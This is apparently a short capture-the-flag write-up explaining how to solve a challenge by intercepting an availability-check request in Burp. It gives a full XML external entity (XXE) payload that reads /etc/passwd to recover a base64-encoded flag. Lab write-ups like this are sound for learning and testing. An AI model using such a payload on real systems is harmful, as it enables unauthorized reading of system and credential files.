# How to Solve the Challenge?

Intercept the check availability request using Burp and modify the XML payload to the below one.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<availabilityCheck>
  <item>
    &xxe;
  </item>
</availabilityCheck>
```

This will return the etc/passwd file that contains the flag that is base64 encoded, decode it and there you go!
